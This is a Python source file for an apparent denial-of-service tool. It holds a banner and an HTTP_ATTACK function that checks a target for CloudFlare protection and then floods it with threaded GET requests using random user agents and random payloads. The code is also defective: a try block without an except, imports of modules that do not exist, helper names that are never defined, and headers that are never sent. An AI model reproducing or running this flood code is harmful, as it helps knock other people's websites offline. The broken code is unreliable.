# -*- coding: utf-8 -*-
# CHECK IMPORT
try:
    import socket
    import threading
    import string
    import random
    import time
    import os
    import platform
    import sys
    import fade
    from colorama import Fade

logo =  """
        @ @ @ @ @    @     @ @ @ @ @ @ @    @ @ @  @       @
        @         @  @      @         @   @        @     @
        @         @  @       @       @   @         @   @
        @ @ @ @ @    @        @     @    @         @ @
        @         @  @         @   @     @         @   @   
        @         @  @          @ @       @        @     @
        @ @ @ @ @    @ @ @ @ @   @          @ @ @  @       @
      
        @ @ @      @ @    @     @  @ @ @ @  @ @ @ @  @ @ @
              @  @     @  @ @   @     @     @        @     @
        @ @ @    @ @ @ @  @   @ @     @     @ @ @    @ @ @
        @        @     @  @     @     @     @ @ @ @  @     @

        """

def HTTP_ATTACK(threads, attack_time, target):
	# Finish
	global FINISH
	FINISH = False

	if ipTools.isCloudFlare(target):
		print("\033[1;33m"+"[!]"+"\033[0m"+" This site is under CloudFlare protection.")
		if input("\033[1;77m"+"[?]"+"\033[0m"+" Continue HTTP attack? (y/n): ").strip(" ").lower() != "y":
			exit()

	print("\033[1;34m"+"[*]"+"\033[0m"+" Starting HTTP attack...")
	
	threads_list = []
	# Load 25 random user agents
	user_agents = []
	for _ in range(threads):
		user_agents.append( randomData.random_useragent() )


	# HTTP flood
	def http_flood():
		global FINISH
		while True:
			if FINISH:
				break
			payload = str(random._urandom(random.randint(1, 30)))
			headers = {
				"X-Requested-With": "XMLHttpRequest",
				"Connection": "keep-alive",
				"Pragma": "no-cache",
				"Cache-Control": "no-cache",
				"Accept-Encoding": "gzip, deflate, br",
				"User-agent": random.choice(user_agents)
			}
			try:
				r = requests.get(target, params = payload)
			except Exception as e:
				print(e)
				time.sleep(2)
			else:
				print("\033[1;32m"+"[+]"+"\033[0m"+" HTTP packet with size " + str(len(payload)) + " was sent!")
